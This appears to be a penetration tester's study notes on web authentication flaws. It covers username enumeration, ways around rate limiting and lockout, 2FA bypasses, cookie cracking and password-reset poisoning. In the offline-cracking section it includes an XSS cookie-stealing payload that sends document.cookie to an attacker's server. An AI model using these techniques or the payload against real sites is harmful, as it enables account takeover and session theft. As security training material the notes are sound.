# Authentication

### How do authentication vulnerabilities arise?

* Authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
* Logic flaws or poor coding in the implementation -> commonly known as broken auth

### Vulnerabilities in Password-Based Login&#x20;

* Check for email addresses of admins or users in response&#x20;
* **Username Enumeration**
  * Observe changes in the website's behavior in order to identify whether a given username is valid
  * Pay attention to : status codes, error messages, and response time
  * Bypass IP based brute force protection using http request headers (X-Forwarded-For)
* **Flawed Brute-Force Protection**
  * If app blocks an account based on IP address (with regards to multiple login attempts)
  * Bypass by logging in using correct credentials (create a legit account) alternatively while brute forcing for other accounts
  * Account lockout (with regards to multiple login attempts)
  * Bypass - cluster bomb method - for valid username it shows a different response - make use of 2 payloads (username and null payloads(5 times))
  * Credential stuffing - username/password pairs obtained from some data breach
* **User Rate Limiting**
  * Too many login requests within a short period of time causes your IP address to be blocked
  * Bypass - in password change the value from single value to an array of passwords
* **HTTP Basic Authentication**
  * Client receives authentication token from server, constructed by concatenating the username and password, and encoding it in Base64
  * Leads to session based exploits and [cross-site-request-forgery-csrf.md](../cross-site-request-forgery-csrf.md "mention")

### Vulnerabilities in MFA

* **2FA Simple Bypass**&#x20;
  * Without providing the OTP -> since already in logged-in state (try accessing some other link in the application)
* **2FA Broken Logic**
  * Make use of cookie assigned to actual user for logging into the victim account
  * Might be using a second login to send OTP linked to that victim account - after initiating the OTP -> brute force the OTP
* **2FA Bypass using a Brute-Force Attack**
  * If application uses a lockout mechanism for multiple OTP attempts based on session
  * Create a macro in project options -> sessions providing the required requests needed to initiate new session for each attempt made.
  * Macro to work -> add session rules and appropriate options

### Vulnerabilities in Other Authentication Mechanisms <sub>(change password or reset email)</sub>&#x20;

* **Brute-Forcing a Stay-Logged-in Cookie** ( remember me or keep me logged in)&#x20;
  * Analyze the cookie - how its constructed - might contain in encoded form which contains username and hash of password
* **Offline Password Cracking** (crackstation - hash cracking)
  * Make use of [cross-site-scripting-xss.md](../cross-site-scripting-xss.md "mention") payloads (document.location='server-name/'+document.cookie)
  * When victim opens the vulnerable page the cookie is sent to our server
* **Password Reset Broken Logic**
  * Reset URL mentions the ID token of the user whose password is to be changed
  * Check for URL token if it specifies the username or check the request body for info related to user
* **Password Reset Poisoning via Middleware**
  * Make use of [host-header-attacks.md](../host-header-attacks.md "mention") to send the password reset token to a server that we own
  * `access.log` provides the unique token assigned to the victim
* **Password Brute-Force via Password Change**
  * After logging in as actual user intercept the password reset page that checks whether the old password matches the username parameter
  * Brute force the old password parameter to reset the password of victim user
  * Check for different scenarios to observe any difference in server response
  * eg: provide correct old password and different new password in 2 input fields and vice-versa
